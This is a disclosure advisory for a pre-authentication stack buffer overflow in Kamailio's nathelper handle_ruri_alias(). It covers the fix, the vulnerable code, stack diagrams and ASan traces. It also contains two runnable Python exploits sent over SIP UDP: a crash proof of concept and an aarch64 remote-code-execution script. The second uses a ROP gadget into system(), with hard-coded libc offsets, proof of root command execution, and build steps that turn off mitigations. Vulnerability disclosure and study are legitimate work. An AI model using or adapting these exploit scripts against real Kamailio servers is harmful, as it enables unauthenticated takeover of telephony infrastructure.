# nathelper: Pre-auth stack buffer overflow in handle_ruri_alias() with RCE

**Module**: nathelper
**Severity**: Critical (pre-auth remote code execution)
**Tested against**: kamailio commit `7c2d6bffa348` (2026-04-21)
**Fixed in**: [`792819cddb`](https://github.com/kamailio/kamailio/commit/792819cddb) ("nathelper: check for size of r-uri")
**Committed**: 2026-04-24 23:35:44 +02:00
**Stable backports**: Kamailio 6.1 [`a44c3ed1a1`](https://github.com/kamailio/kamailio/commit/a44c3ed1a1512fa725969880b2bdc033f9598620) (2026-05-18) and Kamailio 6.0 [`066f38b26d`](https://github.com/kamailio/kamailio/commit/066f38b26d2a6c2e0fee78304faf14364309107f) (2026-06-16)

---

## Fix

The fix adds an early size check in `ki_handle_ruri_alias_mode()` for both the original Request-URI and `new_uri`. If either length exceeds `MAX_URI_SIZE - 1`, the function logs `very long Request-URI` and returns `-1` before parsing the alias or copying any URI segments into the fixed stack buffer.

When removing the `alias` parameter from the Request-URI, `ki_handle_ruri_alias_mode()` copies the URI into a fixed-size stack buffer `buf[MAX_URI_SIZE]` (1024 bytes) without validating the total URI length. Only the alias parameter *value* is checked against `MAX_URI_SIZE - 128`, but not the rest of the URI. The two `memcpy()` calls at lines 1305 and 1308 copy the URI prefix and suffix around the alias parameter into `buf` with no bounds checking.

An unauthenticated attacker triggers this by sending a SIP INVITE with a Request-URI longer than 1024 bytes containing a valid `alias` parameter. The overflow writes attacker-controlled content past the stack buffer, overwriting saved registers and the return address.

Remote code execution was demonstrated on **aarch64** via a ROP chain through libc gadgets. The `handle_ruri_alias()` function is the standard NAT traversal configuration used in the majority of production Kamailio deployments.

## Visual overview

### Attack flow

```
  Attacker                           Kamailio
  ───────                           ────────
     │   SIP INVITE (UDP:5060)
     │   R-URI = sip:AAA...2000...AAA@a.com;alias=1.2.3.4~5060~1
     │   (total R-URI > 2000 bytes, contains valid alias param)
     │──────────────────────────────►│
     │                               │  SIP parser extracts R-URI
     │                               │
     │                         ┌─────▼──────┐
     │                         │  Routing    │  handle_ruri_alias()
     │                         │  Script     │  (standard NAT config)
     │                         └─────┬──────┘
     │                               │
     │                         ┌─────▼──────────────────────────────┐
     │                         │  ki_handle_ruri_alias_mode()       │
     │                         │                                    │
     │                         │  1. Find ";alias=" in R-URI  ✓     │
     │                         │  2. Check alias VALUE length ✓     │
     │                         │     (ip_port_len < 896)            │
     │                         │  3. Check TOTAL URI length  ✗ NONE │
     │                         │                                    │
     │                         │  4. memcpy(buf, prefix, 2017)      │
     │                         │     ──── 2017 bytes into ────      │
     │                         │     ────  buf[1024]  ────          │
     │                         │     ──── OVERFLOW ────             │
     │                         └─────┬──────────────────────────────┘
     │                               │  function returns
     │                         ┌─────▼──────┐
     │                         │  ROP chain  │  saved LR → libc gadget
     │                         │  executes   │  → system("id>/tmp/pwned")
     │                         └─────────────┘
```

### The validation gap

```
  R-URI parsed by handle_ruri_alias():

  sip:AAAA..(2000 bytes)..AAAA@attacker.com;alias=1.2.3.4~5060~1
  │                                        │ │                   │
  │◄──────── "prefix" ────────────────────►│ │◄── alias param ──►│
  │          (2017 bytes)                   │ │   (21 bytes)      │
  │                                        │ │                   │
  │          LENGTH NOT CHECKED ✗           │ │  LENGTH CHECKED ✓ │
  │                                        │ │  < MAX_URI_SIZE   │
  └────────────────────────────────────────┘ │  - 128 (=896)     │
                     │                       └───────────────────┘
                     │
                     ▼
            memcpy(buf, prefix, 2017)     ◄── copies into buf[1024]
                                               993 bytes past end
```

### Stack layout at overflow (aarch64)

```
  ki_handle_ruri_alias_mode() stack frame
  ┌──────────────────────────────────────────────┐
  │  uri (str_s)                    [16 bytes]    │  offset 32
  │  proto (str_s)                  [16 bytes]    │  offset 64
  ├──────────────────────────────────────────────┤
  │  buf[0]                                       │  offset 96
  │  ┊                                            │
  │  ┊  Attacker's URI data                       │
  │  ┊  "sip:AAAA...@attacker.com"                │
  │  ┊  (without the alias parameter)             │
  │  ┊                                            │
  │  ┊  1024 bytes of buffer space                │
  │  ┊                                            │
  │  buf[1023]                                    │  offset 1119
  ╞══════════════════════════════════════════════╡  offset 1120
  │  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ │  993 bytes of overflow
  │  ░░░░░░ attacker-controlled data ░░░░░░░░░░░ │  smashes everything below
  │  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ │
  └──────────────────────────────────────────────┘
  handle_ruri_alias_f() stack frame  (CALLER)
  ┌──────────────────────────────────────────────┐
  │  ...                                          │
  │  ░░ saved x29 (frame pointer)  ░░░░░░░░░░░░ │  pad[1052]  ◄── junk
  │  ░░ saved x30 (link register)  ░░░░░░░░░░░░ │  pad[1060]  ◄── GADGET addr
  └──────────────────────────────────────────────┘
```

### ROP chain (aarch64 — libc gadgets)

```
  After handle_ruri_alias_f() returns, x30 = GADGET:

  ┌─────────────────────────────────────────────────────────┐
  │  GADGET:  ldr x0, [sp, #24]                             │
  │           ldp x29, x30, [sp], #32                        │
  │           ret                                            │
  └───────────────────────┬─────────────────────────────────┘
                          │
    Stack at this point:  │
    ┌─────────────────────▼──────────────┐
    │  [sp+0]   x29 = junk               │  ◄── don't care
    │  [sp+8]   x30 = system()           │  ◄── loaded into LR
    │  [sp+16]  (unused)                  │
    │  [sp+24]  CMD_ADDR ─────────────┐  │  ◄── loaded into x0
    └─────────────────────────────────│──┘
                                      │
    After gadget:                     │
      x0  = CMD_ADDR ◄───────────────┘    points to cmd in SIP URI
      x30 = system()                       loaded from [sp+8]
      ret → system(x0)                    executes attacker command

    ┌─────────────────────────────────────┐
    │  system("id>/tmp/pwned")             │
    │                                      │
    │  $ docker exec kamailio cat /tmp/pwned
    │  uid=0(root) gid=0(root)             │
    └─────────────────────────────────────┘

  NOTE: Command embedded in the R-URI itself (already in buf on the stack).
        No spaces allowed (SIP parser constraint) — use ${IFS} instead.
```

## Vulnerable code

```c
// nathelper.c:1172 — ki_handle_ruri_alias_mode()
char buf[MAX_URI_SIZE];  // MAX_URI_SIZE = 1024

// ... alias parameter is found and validated ...
// Only check (line 1241): validates ip_port_len < MAX_URI_SIZE - 128
// This ONLY constrains the alias value, NOT the entire URI.

at = &(buf[0]);
len = rest - 1 /* ; */ - cur_uri;       // length of URI before alias param
memcpy(at, cur_uri, len);               // LINE 1305: OVERFLOW — no bounds check
at = at + len;
len = cur_uri_len - alias_len - len;
memcpy(at, rest + alias_len - 1, len);  // LINE 1308: additional overflow
```

## Call chain

```
udp_rcv_loop()
  → receive_msg()
    → run_top_route()
      → run_actions()
        → do_action()
          → handle_ruri_alias_f()
            → ki_handle_ruri_alias_mode()   ← STACK OVERFLOW at memcpy (line 1305)
              → rewrite_uri()               ← secondary overflow from corrupted buf
```

## Exploitation (aarch64)

The overflow occurs via `memcpy` — null bytes are preserved. Stack layout of `ki_handle_ruri_alias_mode()`:

- `buf` starts at stack offset 0xc0 from frame pointer
- `handle_ruri_alias_f()` saved LR at `buf[1060]` (pad offset)
- Total overflow: attacker sends 2000-byte user part → 2017-byte write into 1024-byte buffer → ~1000 bytes past end

ROP chain:
1. Overflow saved LR → libc gadget: `ldr x0, [sp, #24]; ldp x29, x30, [sp], #32; ret`
2. Gadget loads `x0` = pointer to command string from `[sp+24]`
3. Gadget loads `x30` = `system()` from `[sp+8]`
4. `ret` → `system(cmd)`

The command string is embedded at a known offset within the SIP URI itself (which is already in the stack buffer). No separate data channel needed.

Constraints: the command cannot contain spaces (0x20) because the SIP first-line parser treats them as the URI/version separator. Use `${IFS}` as a space substitute.

### Offsets (aarch64, non-PIE, Debian bookworm, gcc):
```
LIBC_BASE = 0xfffff7d60000
SYSTEM    = LIBC_BASE + 0x049f00
GADGET    = LIBC_BASE + 0x06ddd0   # ldr x0,[sp,#24]; ldp x29,x30,[sp],#32; ret
LR_OFFSET = 1060                    # pad offset to saved LR
```

## PoC (crash only)

```python
#!/usr/bin/env python3
"""
Kamailio nathelper module - handle_ruri_alias() stack buffer overflow.

The function copies the Request-URI (minus the alias parameter) into a
stack buffer buf[MAX_URI_SIZE] (1024 bytes) without checking the total
URI length. Only the alias VALUE is checked against MAX_URI_SIZE-128.

By sending a URI with a long user part + a valid alias parameter,
the memcpy at nathelper.c:1305 overflows buf[] on the stack.

Requires: nathelper.so loaded, routing script calls handle_ruri_alias()
"""
import socket
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 5060

padding = "A" * 2000
alias = "alias=1.2.3.4~5060~1"
ruri = f"sip:{padding}@attacker.com;{alias}"

msg = (
    f"INVITE {ruri} SIP/2.0\r\n"
    f"Via: SIP/2.0/UDP 127.0.0.1:9999;branch=z9hG4bK-poc\r\n"
    f"From: <sip:poc@attacker.com>;tag=deadbeef\r\n"
    f"To: <sip:target@victim.com>\r\n"
    f"Call-ID: nathelper-overflow-poc@attacker.com\r\n"
    f"CSeq: 1 INVITE\r\n"
    f"Max-Forwards: 70\r\n"
    f"Content-Length: 0\r\n"
    f"\r\n"
)

payload = msg.encode()
print(f"[*] Target: {TARGET}:{PORT}")
print(f"[*] R-URI length: {len(ruri)} bytes")
print(f"[*] Expected overflow: ~{len(padding) - 1024 + 50} bytes past buf[1024]")
print(f"[*] Sending...")

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(3)
s.sendto(payload, (TARGET, PORT))
try:
    data, addr = s.recvfrom(65535)
    print(f"[*] Response: {data.decode(errors='replace').split(chr(13))[0]}")
except socket.timeout:
    print(f"[*] No response (likely crashed)")
s.close()
```

## PoC (RCE — aarch64)

```python
#!/usr/bin/env python3
"""
Kamailio nathelper handle_ruri_alias() — pre-auth RCE exploit

Stack buffer overflow in ki_handle_ruri_alias_mode(). The function copies
the Request-URI (minus the alias parameter) into buf[MAX_URI_SIZE] (1024)
without checking the total URI length. memcpy-based, null bytes survive.

Target: aarch64 Linux, Kamailio built without stack canaries/PIE, ASLR off.
        Tested against kamailio HEAD (2026-04-24), gcc, Debian bookworm.

ROP chain (handle_ruri_alias_f's saved LR at pad[1060]):
  1. Overflow saved LR -> gadget: ldr x0,[sp,#24]; ldp x29,x30,[sp],#32; ret
  2. Gadget loads x0=CMD_ADDR from [sp+24], x30=system() from [sp+8]
  3. ret -> system(CMD_ADDR) -> executes command

NOTE: Command must not contain spaces (0x20) — the SIP first-line parser
treats spaces as the URI/version separator. Use ${IFS} for spaces.
"""
import socket
import struct
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 5060
CMD    = sys.argv[3] if len(sys.argv) > 3 else "id>/tmp/pwned"

LIBC_BASE = 0xfffff7d60000
SYSTEM    = LIBC_BASE + 0x049f00
GADGET    = LIBC_BASE + 0x06ddd0  # ldr x0,[sp,#24]; ldp x29,x30,[sp],#32; ret

BUF_ADDR    = 0xffffffffdd30
LR_OFFSET   = 1060
CMD_OFFSET  = 1200
CMD_ADDR    = BUF_ADDR + CMD_OFFSET + 4

p64 = lambda v: struct.pack('<Q', v)

pad = bytearray(2000)
pad[:LR_OFFSET] = b'A' * LR_OFFSET
pad[LR_OFFSET-8 : LR_OFFSET] = p64(0x4141414141414141)   # x29 (junk)
pad[LR_OFFSET : LR_OFFSET+8] = p64(GADGET)               # saved LR → gadget
pad[LR_OFFSET+8  : LR_OFFSET+16] = p64(0x4242424242424242)  # [sp+0] x29
pad[LR_OFFSET+16 : LR_OFFSET+24] = p64(SYSTEM)              # [sp+8] x30 → system
pad[LR_OFFSET+24 : LR_OFFSET+32] = p64(0x4343434343434343)  # [sp+16] unused
pad[LR_OFFSET+32 : LR_OFFSET+40] = p64(CMD_ADDR)            # [sp+24] → x0

cmd_bytes = CMD.encode() + b'\x00'
pad[CMD_OFFSET : CMD_OFFSET + len(cmd_bytes)] = cmd_bytes

alias = b"alias=1.2.3.4~5060~1"
ruri  = b"sip:" + bytes(pad) + b"@a.com;" + alias
msg   = (
    b"INVITE " + ruri + b" SIP/2.0\r\n"
    b"Via: SIP/2.0/UDP 127.0.0.1:9999;branch=z9hG4bK-rce\r\n"
    b"From: <sip:x@a.com>;tag=exploit\r\n"
    b"To: <sip:x@a.com>\r\n"
    b"Call-ID: rce@exploit\r\n"
    b"CSeq: 1 INVITE\r\n"
    b"Max-Forwards: 70\r\n"
    b"Content-Length: 0\r\n"
    b"\r\n"
)

print(f"[*] Target:  {TARGET}:{PORT}")
print(f"[*] Command: {CMD}")
print(f"[*] Gadget:  0x{GADGET:x}")
print(f"[*] system:  0x{SYSTEM:x}")
print(f"[*] Payload: {len(bytes(pad))} bytes in R-URI")

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(5)
s.sendto(msg, (TARGET, PORT))
try:
    data, _ = s.recvfrom(65535)
    print(f"[*] Response: {data.decode(errors='replace').split(chr(13))[0]}")
except socket.timeout:
    print("[*] No response (worker executing command or crashed)")
s.close()
```

## RCE proof

```
$ python3 exploit.py 127.0.0.1 5060 'id>/tmp/pwned'
[*] Target:  127.0.0.1:5060
[*] Command: id>/tmp/pwned
[*] Gadget:  0xfffff7dcdd0
[*] system:  0xfffff7da9f00
[*] No response (worker executing command or crashed)

$ docker exec kamailio cat /tmp/pwned
uid=0(root) gid=0(root) groups=0(root)
```

## ASan output

Two ASAN reports fire in sequence — the initial WRITE overflow into `buf[1024]`, followed by a READ overflow when `rewrite_uri()` tries to use the corrupted buffer:

```
=================================================================
==23==ERROR: AddressSanitizer: stack-buffer-overflow on address 0xffffffff6a00 at pc 0xaaaaaad55b94 bp 0xffffffff6560 sp 0xffffffff5d50
WRITE of size 2017 at 0xffffffff6a00 thread T0
    #0 0xaaaaaad55b90 in __asan_memcpy (/usr/local/sbin/kamailio+0x2b5b90) (BuildId: 3b3141f943dac6d00cd56f3642337d296592ee6f)
    #1 0xfffff71729e4 in ki_handle_ruri_alias_mode /usr/src/kamailio/build/src/modules/nathelper/nathelper.c:1305:2
    #2 0xfffff715af8c in handle_ruri_alias_f /usr/src/kamailio/build/src/modules/nathelper/nathelper.c:1330:9
    #3 0xaaaaaadc858c in do_action /usr/src/kamailio/build/src/core/action.c:1123:4
    #4 0xaaaaaaded844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #5 0xaaaaaadccfa4 in do_action /usr/src/kamailio/build/src/core/action.c
    #6 0xaaaaaaded844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #7 0xaaaaaadf0390 in run_top_route /usr/src/kamailio/build/src/core/action.c:1703:8
    #8 0xaaaaab2f1c7c in receive_msg /usr/src/kamailio/build/src/core/receive.c:535:8
    #9 0xaaaaab5e11b0 in udp_rcv_loop /usr/src/kamailio/build/src/core/udp_server.c:1420:4
    #10 0xaaaaaada4b28 in main_loop /usr/src/kamailio/build/src/main.c
    #11 0xaaaaaadbee58 in main /usr/src/kamailio/build/src/main.c:3439:8
    #12 0xfffff7d17740  (/lib/aarch64-linux-gnu/libc.so.6+0x27740) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #13 0xfffff7d17814 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x27814) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #14 0xaaaaaacdf56c in _start (/usr/local/sbin/kamailio+0x23f56c) (BuildId: 3b3141f943dac6d00cd56f3642337d296592ee6f)

Address 0xffffffff6a00 is located in stack of thread T0 at offset 1120 in frame
    #0 0xfffff717048c in ki_handle_ruri_alias_mode /usr/src/kamailio/build/src/modules/nathelper/nathelper.c:1170

  This frame has 15 object(s):
    [32, 48) 'uri' (line 1171)
    [64, 80) 'proto' (line 1171)
    [96, 1120) 'buf' (line 1172) <== Memory access at offset 1120 overflows this variable
    [1248, 1312) '__kld' (line 1179)
    [1344, 1408) '__kld104' (line 1185)
    [1440, 1504) '__kld250' (line 1209)
    [1536, 1600) '__kld378' (line 1219)
    [1632, 1696) '__kld522' (line 1234)
    [1728, 1792) '__kld655' (line 1243)
    [1824, 1888) '__kld819' (line 1268)
    [1920, 1984) '__kld950' (line 1275)
    [2016, 2080) '__kld1095' (line 1284)
    [2112, 2176) '__kld1224' (line 1289)
    [2208, 2272) '__kld1354' (line 1291)
    [2304, 2368) '__kld1510' (line 1311)
SUMMARY: AddressSanitizer: stack-buffer-overflow (/usr/local/sbin/kamailio+0x2b5b90) (BuildId: 3b3141f943dac6d00cd56f3642337d296592ee6f) in __asan_memcpy
Shadow bytes around the buggy address:
  0x200fffffecf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200fffffed00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200fffffed10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200fffffed20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200fffffed30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200fffffed40:[f2]f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2
  0x200fffffed50: f8 f8 f8 f8 f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8
  0x200fffffed60: f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8 f8 f8 f8 f8
  0x200fffffed70: f2 f2 f2 f2 f8 f8 f8 f8 f8 f8 f8 f8 f2 f2 f2 f2
  0x200fffffed80: f8 f8 f8 f8 f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8
  0x200fffffed90: f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8 f8 f8 f8 f8
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==23==ABORTING
=================================================================
==23==ERROR: AddressSanitizer: stack-buffer-overflow on address 0xffffffff6a00 at pc 0xaaaaaad55af8 bp 0xffffffff6440 sp 0xffffffff5c30
READ of size 2017 at 0xffffffff6a00 thread T0
    #0 0xaaaaaad55af4 in __asan_memcpy (/usr/local/sbin/kamailio+0x2b5af4) (BuildId: 3b3141f943dac6d00cd56f3642337d296592ee6f)
    #1 0xaaaaaaf506ec in rewrite_uri /usr/src/kamailio/build/src/core/dset.c:803:2
    #2 0xfffff7172f24 in ki_handle_ruri_alias_mode /usr/src/kamailio/build/src/modules/nathelper/nathelper.c:1312:9
    #3 0xfffff715af8c in handle_ruri_alias_f /usr/src/kamailio/build/src/modules/nathelper/nathelper.c:1330:9
    #4 0xaaaaaadc858c in do_action /usr/src/kamailio/build/src/core/action.c:1123:4
    #5 0xaaaaaaded844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #6 0xaaaaaadccfa4 in do_action /usr/src/kamailio/build/src/core/action.c
    #7 0xaaaaaaded844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #8 0xaaaaaadf0390 in run_top_route /usr/src/kamailio/build/src/core/action.c:1703:8
    #9 0xaaaaab2f1c7c in receive_msg /usr/src/kamailio/build/src/core/receive.c:535:8
    #10 0xaaaaab5e11b0 in udp_rcv_loop /usr/src/kamailio/build/src/core/udp_server.c:1420:4
    #11 0xaaaaaada4b28 in main_loop /usr/src/kamailio/build/src/main.c
    #12 0xaaaaaadbee58 in main /usr/src/kamailio/build/src/main.c:3439:8
    #13 0xfffff7d17740  (/lib/aarch64-linux-gnu/libc.so.6+0x27740) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #14 0xfffff7d17814 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x27814) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #15 0xaaaaaacdf56c in _start (/usr/local/sbin/kamailio+0x23f56c) (BuildId: 3b3141f943dac6d00cd56f3642337d296592ee6f)

Address 0xffffffff6a00 is located in stack of thread T0 at offset 1120 in frame
    #0 0xfffff717048c in ki_handle_ruri_alias_mode /usr/src/kamailio/build/src/modules/nathelper/nathelper.c:1170

  This frame has 15 object(s):
    [32, 48) 'uri' (line 1171)
    [64, 80) 'proto' (line 1171)
    [96, 1120) 'buf' (line 1172) <== Memory access at offset 1120 overflows this variable
    [1248, 1312) '__kld' (line 1179)
    [1344, 1408) '__kld104' (line 1185)
    [1440, 1504) '__kld250' (line 1209)
    [1536, 1600) '__kld378' (line 1219)
    [1632, 1696) '__kld522' (line 1234)
    [1728, 1792) '__kld655' (line 1243)
    [1824, 1888) '__kld819' (line 1268)
    [1920, 1984) '__kld950' (line 1275)
    [2016, 2080) '__kld1095' (line 1284)
    [2112, 2176) '__kld1224' (line 1289)
    [2208, 2272) '__kld1354' (line 1291)
    [2304, 2368) '__kld1510' (line 1311)
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow (/usr/local/sbin/kamailio+0x2b5af4) (BuildId: 3b3141f943dac6d00cd56f3642337d296592ee6f) in __asan_memcpy
Shadow bytes around the buggy address:
  0x200fffffecf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200fffffed00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200fffffed10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200fffffed20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200fffffed30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200fffffed40:[f2]f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2
  0x200fffffed50: f8 f8 f8 f8 f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8
  0x200fffffed60: f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8 f8 f8 f8 f8
  0x200fffffed70: f2 f2 f2 f2 f8 f8 f8 f8 f8 f8 f8 f8 f2 f2 f2 f2
  0x200fffffed80: f8 f8 f8 f8 f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8
  0x200fffffed90: f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8 f8 f8 f8 f8
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
```

## Build & reproduce

```bash
git clone https://github.com/kamailio/kamailio.git
cd kamailio && git checkout 7c2d6bffa348

# For RCE (no ASAN, no canaries, no PIE):
mkdir build && cd build
cmake .. -DCMAKE_C_FLAGS="-O2 -fno-stack-protector -no-pie"
make -j$(nproc) && make install

# Routing script must call handle_ruri_alias() — standard NAT config:
#   if(is_method("INVITE") && has_param("alias")) { handle_ruri_alias(); }

# Run with ASLR disabled:
setarch $(uname -m) -R kamailio -DD -E -f kamailio.cfg

# Fire exploit:
python3 exploit.py 127.0.0.1 5060 'id>/tmp/pwned'
docker exec <container> cat /tmp/pwned
```
